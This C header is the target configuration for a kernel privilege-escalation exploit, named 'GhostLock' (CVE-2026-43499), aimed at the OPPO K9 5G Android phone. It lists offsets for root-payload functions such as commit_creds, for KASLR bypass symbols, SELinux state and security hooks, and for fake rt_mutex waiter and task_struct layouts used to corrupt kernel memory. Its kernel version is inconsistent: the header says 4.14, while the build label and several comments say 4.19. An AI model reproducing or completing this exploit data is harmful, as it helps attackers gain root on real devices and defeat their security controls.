#ifndef TARGET_H
#define TARGET_H

/* ================================================================
 * Target: OPPO K9 5G (PEXM00 / OP4E9F) - SM7250
 * Kernel: Linux 4.14 (Android 13, ColorOS 13)
 * Arch: ARM64 (aarch64), 4KB pages
 *
 * CVE-2026-43499 (GhostLock) Target Configuration
 *
 * ⚠️  IMPORTANT:
 *   Offsets marked [FROM System.map] are extracted directly from this device.
 *   Offsets marked [TYPICAL] are based on 4.14 ARM64 reference kernel.
 *   Run extract_symbols.py on your device's /proc/kallsyms for exact values.
 *   Struct offsets MUST be verified before running full exploit.
 * ================================================================ */

#define BUILD_VARIANT_LABEL "oppo_k9_sm7250_4.19.157"
#define BUILD_FINGERPRINT "OPPO/PEXM00/OP4E9F:13/TP1A.220905.001/R.20230:user/release-keys"

/* ================================================================
 * Memory Layout (ARM64 39-bit VA - 4.19 phone kernel typical)
 * ================================================================ */
#define KIMAGE_TEXT_BASE               0xffffff8008080000ULL  /* [FROM System.map] _text */
#define P0_PAGE_OFFSET                 0xffffff8000000000ULL
#define P0_PHYS_OFFSET                 0x80000000ULL
#define DIRECT_MAP_BASE                0xffffff8000000000ULL
#define DIRECT_MAP_END                 0xffffffc000000000ULL
#define VMEMMAP_START                  0xffffffc800000000ULL
#define KERNEL_PHYS_LOAD               0x80000000ULL

/* 4KB pages */
#define PAGE_SHIFT                     12
#define KS_PAGE_SIZE                   4096
#define KS_PAGE_MASK                   0xfffULL
#define PSELECT_WAITER_WORD_SHIFT      1

/* ================================================================
 * Core Kernel Symbols (offsets from KIMAGE_TEXT_BASE)
 * ================================================================ */

/* Root payload functions [FROM System.map] */
#define COMMIT_CREDS_OFF               0x0006e380ULL  /* commit_creds: ffffff80080ee380 */
#define PREPARE_KERNEL_CRED_OFF        0x0006e6f8ULL  /* prepare_kernel_cred: ffffff80080ee6f8 */
#define INIT_TASK_OFF                  0x023dc640ULL  /* init_task: ffffff800a45c640 */

#define INIT_TASK                      (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define COMMIT_CREDS                   (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
#define PREPARE_KERNEL_CRED            (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)

/* ================================================================
 * KASLR Bypass / Slide symbols
 * ================================================================ */
#define SLIDE_INIT_NSPROXY_OFF         0x023ec4f0ULL  /* [FROM System.map] init_nsproxy: ffffff800a46c4f0 */
#define SLIDE_INIT_NET_OFF             0x00000000ULL  /* NOT FOUND */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x00000000ULL  /* NOT FOUND - try: /proc/sys/kernel/random/boot_id */
#define SLIDE_SYSCTL_BOOTID_OFF        0x02ae5884ULL  /* [FROM System.map] sysctl_bootid: ffffff800ab65884 */

/* ================================================================
 * Exploit Target: ConfigFS (4.14 kernel - uses file_operations, not read_iter/write_iter)
 * ================================================================ */
#define CONFIGFS_READ_FILE_OFF         0x003158e0ULL  /* [FROM System.map] configfs_read_file: ffffff80083958e0 */
#define CONFIGFS_WRITE_FILE_OFF        0x00315a00ULL  /* [FROM System.map] configfs_write_file: ffffff8008395a00 */
#define CONFIGFS_READ_BIN_FILE_OFF     0x00315c10ULL  /* [FROM System.map] configfs_read_bin_file: ffffff8008395c10 */
#define CONFIGFS_WRITE_BIN_FILE_OFF    0x00315d90ULL  /* [FROM System.map] configfs_write_bin_file: ffffff8008395d90 */
#define CONFIGFS_FILE_OPERATIONS_OFF   0x018f9280ULL  /* [FROM System.map] configfs_file_operations: ffffff8009979280 */
#define CONFIGFS_BIN_FILE_OPERATIONS_OFF 0x018f93a0ULL  /* [FROM System.map] configfs_bin_file_operations: ffffff80099793a0 */

#define CONFIGFS_READ_FILE             (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
#define CONFIGFS_WRITE_FILE            (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_FILE_OFF)
#define CONFIGFS_READ_BIN_FILE         (KIMAGE_TEXT_BASE + CONFIGFS_READ_BIN_FILE_OFF)
#define CONFIGFS_WRITE_BIN_FILE        (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_OFF)
#define CONFIGFS_FILE_OPERATIONS       (KIMAGE_TEXT_BASE + CONFIGFS_FILE_OPERATIONS_OFF)
#define CONFIGFS_BIN_FILE_OPERATIONS   (KIMAGE_TEXT_BASE + CONFIGFS_BIN_FILE_OPERATIONS_OFF)

/* ================================================================
 * Exploit Target: Pipe Buffer Operations
 * ================================================================ */
#define ANON_PIPE_BUF_OPS_OFF          0x018ebb00ULL  /* [FROM System.map] anon_pipe_buf_ops: ffffff800996bb00 */
#define NOS_TEAL_PIPE_BUF_OPS_OFF      0x018ed470ULL  /* [FROM System.map] nosteal_pipe_buf_ops: ffffff800996d470 */
#define PIPE_READ_OFF                  0x00264320ULL  /* [FROM System.map] pipe_read: ffffff80082e4320 */
#define PIPE_WRITE_OFF                 0x00264628ULL  /* [FROM System.map] pipe_write: ffffff80082e4628 */
#define COPY_SPLICE_READ_OFF           0x002992d8ULL  /* [FROM System.map] generic_file_splice_read: ffffff80083192d8 */

#define ANON_PIPE_BUF_OPS              (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define NOS_TEAL_PIPE_BUF_OPS          (KIMAGE_TEXT_BASE + NOS_TEAL_PIPE_BUF_OPS_OFF)

/* ================================================================
 * Generic VFS
 * ================================================================ */
#define GENERIC_FILE_LLSEEK_OFF        0x00256818ULL  /* [FROM System.map] generic_file_llseek: ffffff80082d6818 */
#define NO_LLSEEK_OFF                  0x00256a40ULL  /* [FROM System.map] no_llseek: ffffff80082d6a40 */
#define GENERIC_FILE_READ_ITER_OFF     0x001c3200ULL  /* [FROM System.map] generic_file_read_iter: ffffff8008243200 */
#define GENERIC_FILE_WRITE_ITER_OFF    0x001c52a8ULL  /* [FROM System.map] generic_file_write_iter: ffffff80082452a8 */

/* ================================================================
 * Ashmem (Android-specific)
 * ================================================================ */
#define ASHMEM_FOPS_OFF                0x01a415a0ULL  /* [FROM System.map] ashmem_fops: ffffff8009ac15a0 */
#define ASHMEM_MISC_FOPS_OFF           0x00000000ULL  /* NOT FOUND - try: /sys/kernel/debug/ashmem */
#define ASHMEM_IOCTL_OFF               0x00d57f38ULL  /* [FROM System.map] ashmem_ioctl: ffffff8008dd7f38 */
#define ASHMEM_MMAP_OFF                0x00d588b8ULL  /* [FROM System.map] ashmem_mmap: ffffff8008dd88b8 */

#define ASHMEM_FOPS                    (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)

/* ================================================================
 * Slab / Allocator
 * ================================================================ */
#define KMALLOC_CACHES_OFF             0x01fd8888ULL  /* [FROM System.map] kmalloc_caches: ffffff800a058888 */

/* ================================================================
 * Security / SELinux
 * ================================================================ */
#define SELINUX_STATE_OFF              0x03128000ULL  /* [FROM System.map] selinux_state: ffffff800b1a8000 */
#define SELINUX_ENFORCING_OFF          0x00000000ULL  /* NOT FOUND - try: selinux_enforcing_boot or /sys/fs/selinux/enforce */
#define SECURITY_HOOK_HEADS_OFF        0x01fd8d88ULL  /* [FROM System.map] security_hook_heads: ffffff800a058d88 */
#define SELINUX_BLOB_SIZES_OFF         0x00000000ULL  /* NOT FOUND */

#define SELINUX_ENFORCING              (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS            (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)

/* ================================================================
 * Misc Kernel Data
 * ================================================================ */
#define EMPTY_ZERO_PAGE_OFF            0x028ee000ULL  /* [FROM System.map] empty_zero_page: ffffff800a96e000 */
#define ROOT_TASK_GROUP_OFF            0x028f4dc0ULL  /* [FROM System.map] root_task_group: ffffff800a974dc0 */
#define INIT_UTS_NS_OFF                0x023dc3e8ULL  /* [FROM System.map] init_uts_ns: ffffff800a45c3e8 */
#define KERNEL_READ_OFF                0x002570c8ULL  /* [FROM System.map] kernel_read: ffffff80082d70c8 */
#define KERNEL_WRITE_OFF               0x00257510ULL  /* [FROM System.map] kernel_write: ffffff80082d7510 */

/* ================================================================
 * Vulnerability Verification Symbols
 * ================================================================ */
#define RT_MUTEX_START_PROXY_LOCK_OFF  0x000ccb78ULL  /* [FROM System.map] rt_mutex_start_proxy_lock: ffffff800814cb78 */
#define REMOVE_WAITER_OFF              0x000ccc08ULL  /* [FROM System.map] remove_waiter: ffffff800814cc08 */
#define FUTEX_REQUEUE_OFF              0x00112680ULL  /* [FROM System.map] futex_requeue: ffffff8008192680 */

/* ================================================================
 * Payload Page Layout (for fake lock route)
 * ================================================================ */
#define LOCK_OFF                       0x1350
#define W0_OFF                         0x2220
#define FOPS_OFF                       0x1000
#define SCRATCH_OFF                    0x3000
#define RIGHT_OFF                      0x4440
#define LEFT_OFF                       0x5550
#define FAKE_TASK_OFF                  0x3200

/* ================================================================
 * rt_mutex_waiter struct offsets [VERIFY for 4.19!]
 * ================================================================ */
#define WAITER_TREE_ENTRY_OFF          0x00
#define WAITER_PI_TREE_ENTRY_OFF       0x18
#define WAITER_TASK_OFF                0x30
#define WAITER_LOCK_OFF                0x38
#define WAITER_WAKE_STATE_OFF          0x40
#define WAITER_PRIO_OFF                0x44
#define WAITER_DEADLINE_OFF            0x48
#define WAITER_WW_CTX_OFF              0x50

/* Fake waiter in payload page */
#define FAKE_WAITER_TREE_PRIO_OFF      0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF  0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF  0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF   0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF           0x50
#define FAKE_WAITER_LOCK_OFF           0x58
#define FAKE_WAITER_WAKE_STATE_OFF     0x60
#define FAKE_WAITER_WW_CTX_OFF         0x68

/* ================================================================
 * task_struct offsets [CRITICAL - VERIFY for 4.19!]
 * ================================================================ */
#define TASK_PID_OFF                   0x618   /* [TYPICAL 4.19 arm64] */
#define TASK_TGID_OFF                  0x61c   /* [TYPICAL 4.19 arm64] */
#define TASK_REAL_PARENT_OFF           0x628   /* [TYPICAL 4.19 arm64] */
#define TASK_REAL_CRED_OFF             0x818   /* [TYPICAL 4.19 arm64] */
#define TASK_CRED_OFF                  0x820   /* [TYPICAL 4.19 arm64] */
#define TASK_COMM_OFF                  0x830   /* [TYPICAL 4.19 arm64] */
#define TASK_TASKS_OFF                 0x550   /* [TYPICAL 4.19 arm64] */
#define TASK_SECCOMP_OFF               0x8e8   /* [TYPICAL 4.19 arm64] */

/* ⚠️ CRITICAL FOR EXPLOIT - pi_blocked_on offset */
#define TASK_PI_BLOCKED_ON_OFF         0x950   /* [TYPICAL 4.19 - MUST VERIFY!] */

/* Fake task layout for payload */
#define FAKE_TASK_PRIO_OFF             0x84
#define FAKE_TASK_NORMAL_PRIO_OFF      0x8c
#define FAKE_TASK_TASK_GROUP_OFF       0x348
#define FAKE_TASK_PI_LOCK_OFF          0x924
#define FAKE_TASK_PI_WAITERS_OFF       0x938
#define FAKE_TASK_PI_TOP_TASK_OFF      0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF    0x950

/* ================================================================
 * cred struct offsets
 * ================================================================ */
#define CRED_UID_OFF                   8
#define CRED_GID_OFF                   12
#define CRED_SECUREBITS_OFF            40
#define CRED_CAPS_OFF                  48
#define CRED_SECURITY_OFF              128

/* ================================================================
 * file_operations struct offsets (4.19 typical)
 * ================================================================ */
#define FOPS_OWNER_OFF                 0x00
#define FOPS_LLSEEK_OFF                0x08
#define FOPS_READ_OFF                  0x10
#define FOPS_WRITE_OFF                 0x18
#define FOPS_READ_ITER_OFF             0x20
#define FOPS_WRITE_ITER_OFF            0x28
#define FOPS_IOCTL_OFF                 0x50
#define FOPS_COMPAT_IOCTL_OFF          0x58
#define FOPS_MMAP_OFF                  0x60
#define FOPS_OPEN_OFF                  0x70
#define FOPS_RELEASE_OFF               0x80
#define FOPS_SPLICE_READ_OFF           0xc0

/* ================================================================
 * pipe_inode_info struct offsets [VERIFY!]
 * ================================================================ */
#define PIPE_BUFFER_SIZE               0x28
#define PIPE_BUFFER_SLOTS              16
#define PIPE_BUF_FLAG_CAN_MERGE        0x10
#define PIPE_HEAD_OFF                  0x60
#define PIPE_TAIL_OFF                  0x64
#define PIPE_MAX_USAGE_OFF             0x68
#define PIPE_RING_SIZE_OFF             0x6c
#define PIPE_BUFS_OFF                  0xa8

/* ================================================================
 * ConfigFS item offsets
 * ================================================================ */
#define CFG_PAGE_OFF                   16
#define CFG_NEEDS_READ_FILL_OFF        80
#define CFG_BIN_BUFFER_OFF             88
#define CFG_BIN_BUFFER_SIZE_OFF        96
#define CFG_CB_MAX_SIZE_OFF            100

#endif /* TARGET_H */
